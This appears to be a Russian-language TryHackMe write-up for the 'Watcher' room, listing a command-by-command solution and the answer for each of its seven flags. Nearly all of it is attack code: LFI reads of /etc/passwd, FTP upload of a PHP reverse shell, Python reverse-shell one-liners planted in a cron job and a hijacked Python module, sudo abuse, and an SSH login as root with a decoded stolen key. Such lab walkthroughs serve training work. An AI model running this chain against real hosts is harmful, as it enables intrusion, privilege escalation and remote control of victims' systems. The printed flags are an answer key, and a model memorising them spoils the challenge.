[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Watcher](https://tryhackme.com/r/room/watcher) 

Всего 1 заданиe:
## Задание 1
Пройдите весь путь через машину и попытайтесь найти все флаги, которые сможете!

Сделано  @rushisec

### Ответьте на вопросы ниже
Флаг 1
```commandline
nmap -sSCV <IP>
curl -s http://<IP>/robots.txt
curl -s http://<IP>/flag_1.txt
```
```commandline
FLAG{robots_dot_text_what_is_next}
```
Флаг 2
```commandline
curl -s http://<IP>/secret_file_do_not_read.txt
curl -s http://<IP>/post.php?post=/etc/passwd
curl -s http://<IP>/post.php?post=secret_file_do_not_read.txt
ftp <IP>
ftpuser:givemefiles777
ls -la
get flag_2.txt -
```
```commandline
FLAG{ftp_you_and_me}
```
Флаг 3
```commandline
ftp <IP>
ftpuser:givemefiles777
cd files
ls -la
put rev.php
ls -la
pwd
exit
curl -s http://<IP>/post.php?post=/home/ftpuser/ftp/files/rev.php
nc -nlvp 4444
python3 -c "import pty;pty.spawn('/bin/bash')"
id
find / -type f -name flag_3.txt 2>/dev/null
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
```
```commandline
FLAG{lfi_what_a_guy}
```
Флаг 4
```commandline
find / -type f -name flag_4.txt -exec ls -l {} + 2>/dev/null
sudo -l
sudo -u toby /bin/bash
cat /home/toby/flag_4.txt
```
```commandline
FLAG{chad_lifestyle}
```
Флаг 5
```commandline
find / -type f -name flag_5.txt -exec ls -l {} + 2>/dev/null
cat note.txt
cat /etc/crontab
ls -l /home/toby/jobs/cow.sh

cat > /home/toby/jobs/cow.sh << EOF
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
EOF

nc -nlvp 4444
python3 -c "import pty;pty.spawn('/bin/bash')"
cd /home/mat
cat flag_5.txt
```
```commandline
FLAG{live_by_the_cow_die_by_the_cow}
```
Флаг 6
```commandline
find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null
cat /home/mat/note.txt
sudo -l
cat /home/mat/scripts/will_script.py
cat cmd.py

vim cmd.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<IP>",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
       
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1 
nc -nlvp 5555
python3 -c "import pty;pty.spawn('/bin/bash')"
id
cd /home/will
cat flag_6.txt
```
```commandline
FLAG{but_i_thought_my_script_was_secure}
```
Флаг 7
```commandline
find / -type f -name flag_7.txt -exec ls -l {} + 2>/dev/null
id
find / -type f -group adm -exec ls -l {} + 2>/dev/null
cat /opt/backups/key.b64 | base64 -d > /home/will/ssh.key
chmod 600 ssh.key 
ssh -i ssh.key root@<IP>
cd root
cat flag_7.txt
```
```commandline
FLAG{who_watches_the_watchers}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)